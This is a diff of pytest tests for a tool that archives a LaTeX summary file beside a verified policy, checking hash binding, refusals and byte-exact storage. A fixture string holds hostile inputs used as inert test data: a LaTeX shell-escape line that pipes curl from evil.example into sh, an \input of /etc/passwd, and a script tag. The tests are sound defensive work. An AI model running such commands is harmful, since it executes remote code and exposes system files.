@@ -136,3 +136,126 @@ def test_github_source_decodes_the_contents_api_and_refuses_anything_else():
     assert calls == [(f"https://api.github.com/repos/{ap.REPOSITORY}/contents/{ap.SOURCE_PATH}?ref={HEAD}", "tok")]
     with pytest.raises(ap.ArchiveRefused):
         ap.github_source(HEAD, "tok", lambda *a, **k: {"type": "dir"})
+
+
+# ---- the optional summary.tex: archived verbatim beside the policy, bound to the head commit in both directions, never interpreted
+HOSTILE = ("\\documentclass{article}\n\\immediate\\write18{curl http://evil.example | sh}\n\\input{/etc/passwd}\n@everyone @octocat <script>alert(1)</script> ![x](http://e/x.png)\n"
+           + "x" * 60000 + "\r\n\ttab and CRLF kept \u00e9\u2211\n")
+
+
+def with_summary(text=HOSTILE, **kw):
+    v = verification(**kw)
+    v.update(summarySource=text, summarySha256=ap.sha256(text), summaryBytes=len(text.encode()))
+    return v
+
+
+def show_bytes(bare, path):
+    return subprocess.run(["git", "-C", str(bare), "show", f"{ap.BRANCH}:{path}"], check=True, capture_output=True).stdout
+
+
+def test_a_summary_is_archived_byte_for_byte_and_recorded_in_the_index(remote):
+    bare, clone = remote
+    out = archive(clone, with_summary(), summary=HOSTILE)
+    assert out["added"] is True
+    assert show_bytes(bare, f"{out['path']}/summary.tex") == HOSTILE.encode(), "verbatim, CRLF and all: nothing was interpreted, rendered or normalised"
+    assert show_bytes(bare, f"{out['path']}/Policy.lean") == SOURCE.encode()
+    index = json.loads(show_bytes(bare, ap.INDEX_PATH))
+    assert index["policies"][0]["summarySha256"] == ap.sha256(HOSTILE)
+    stored = json.loads(show_bytes(bare, f"{out['path']}/verification.json"))
+    assert "summarySource" not in stored and "leanSource" not in stored, "each text is stored once, as its own file"
+    assert stored["summarySha256"] == ap.sha256(HOSTILE) and stored["summaryBytes"] == len(HOSTILE.encode())
+    changed = git(bare, "show", "--name-only", "--format=", ap.BRANCH).splitlines()
+    assert sorted(changed) == sorted([ap.INDEX_PATH, f"{out['path']}/Policy.lean", f"{out['path']}/policy.json", f"{out['path']}/summary.tex", f"{out['path']}/verification.json"])
+
+
+def test_a_policy_without_a_summary_archives_exactly_as_before(remote):
+    bare, clone = remote
+    out = archive(clone)
+    assert "summarySha256" not in json.loads(show_bytes(bare, ap.INDEX_PATH))["policies"][0]
+    names = git(bare, "ls-tree", "-r", "--name-only", ap.BRANCH, out["path"]).splitlines()
+    assert not any(n.endswith("summary.tex") for n in names)
+
+
+def test_archiving_a_summary_twice_is_a_no_op_and_a_changed_summary_is_refused(remote):
+    bare, clone = remote
+    first = archive(clone, with_summary(), summary=HOSTILE)
+    again = archive(clone, with_summary(), summary=HOSTILE)
+    assert again["added"] is False and again["commit"] == first["commit"] == git(bare, "rev-parse", ap.BRANCH)
+    other = "another summary\n"
+    with pytest.raises(ap.ArchiveRefused, match="different policy"):
+        archive(clone, with_summary(other), summary=other)                  # same head, same policy, a different summary
+    with pytest.raises(ap.ArchiveRefused, match="different policy"):
+        archive(clone)                                                      # same head re-run without the summary
+    assert git(bare, "rev-parse", ap.BRANCH) == first["commit"]
+
+
+def test_the_verification_and_the_head_commit_must_agree_on_the_summary_in_both_directions(remote):
+    bare, clone = remote
+    before = git(bare, "rev-parse", ap.BRANCH)
+    with pytest.raises(ap.ArchiveRefused, match="does not carry"):
+        archive(clone, verification(), summary="on the head only\n")        # a summary the verification never saw
+    with pytest.raises(ap.ArchiveRefused, match="does not have"):
+        archive(clone, with_summary("only in the artifact\n"), summary=None)  # a summary the head commit does not have
+    with pytest.raises(ap.ArchiveRefused, match="not the file at the pull request"):
+        archive(clone, with_summary("verified text\n"), summary="head text\n")
+    forged = with_summary("same\n")
+    forged["summarySha256"] = "0" * 64
+    with pytest.raises(ap.ArchiveRefused, match="not the file at the pull request"):
+        archive(clone, forged, summary="same\n")
+    stray = verification()
+    stray["summarySha256"] = ap.sha256("x")                                 # a hash with no text, and nothing at the head
+    with pytest.raises(ap.ArchiveRefused, match="does not have"):
+        archive(clone, stray, summary=None)
+    assert git(bare, "rev-parse", ap.BRANCH) == before, "nothing was pushed"
+
+
+def test_a_summary_that_breaks_a_rule_is_refused_whatever_the_verification_says(remote):
+    bare, clone = remote
+    before = git(bare, "rev-parse", ap.BRANCH)
+    for bad, why in (("a\x00b\n", r"U\+0000"), ("a" * 102401, "limit"), ("  \n", "empty")):
+        with pytest.raises(ap.ArchiveRefused, match=why):
+            archive(clone, with_summary(bad), summary=bad)
+    assert git(bare, "rev-parse", ap.BRANCH) == before
+
+
+def test_github_summary_is_none_only_for_a_404_and_refuses_what_is_not_a_text_file():
+    def contents(data):
+        return lambda url, token, payload=None: data
+    good = {"type": "file", "encoding": "base64", "content": base64.encodebytes(HOSTILE.encode()).decode()}
+    assert ap.github_summary(HEAD, "tok", contents(good)) == HOSTILE
+    urls = []
+    ap.github_summary(HEAD, "tok", lambda url, token, payload=None: urls.append(url) or good)
+    assert urls == [f"https://api.github.com/repos/{ap.REPOSITORY}/contents/TableGeneration/Submission/summary.tex?ref={HEAD}"]
+
+    def missing(url, token, payload=None):
+        raise RuntimeError("Publisher rejected the request: HTTP 404; inspect the publisher logs")
+    assert ap.github_summary(HEAD, "tok", missing) is None
+    for status in ("403", "500"):
+        def broken(url, token, payload=None, status=status):
+            raise RuntimeError(f"Publisher rejected the request: HTTP {status}; inspect the publisher logs")
+        with pytest.raises(RuntimeError, match=status):                     # an outage or a permission problem is never read as "no summary"
+            ap.github_summary(HEAD, "tok", broken)
+    for odd in ([{"type": "file", "name": "summary.tex"}],                  # a directory listing
+                {"type": "symlink", "target": "/etc/passwd"},
+                {"type": "submodule"},
+                {"type": "file", "encoding": "none", "content": ""}):
+        with pytest.raises(ap.ArchiveRefused):
+            ap.github_summary(HEAD, "tok", contents(odd))
+    bad = {"type": "file", "encoding": "base64", "content": base64.encodebytes(b"caf\xe9\n").decode()}
+    with pytest.raises(ap.ArchiveRefused, match="UTF-8"):
+        ap.github_summary(HEAD, "tok", contents(bad))
+
+
+def test_the_archive_never_runs_anything_for_the_summary(remote, monkeypatch):
+    """The only subprocesses are git's; the summary text is written as bytes and never passed to one."""
+    _, clone = remote
+    started = []
+    real = subprocess.run
+
+    def recording(cmd, *a, **k):
+        started.append(list(cmd))
+        return real(cmd, *a, **k)
+    monkeypatch.setattr(ap.subprocess, "run", recording)
+    archive(clone, with_summary(), summary=HOSTILE)
+    assert started and all(c[0] == "git" for c in started)
+    assert not any("write18" in part for c in started for part in c)
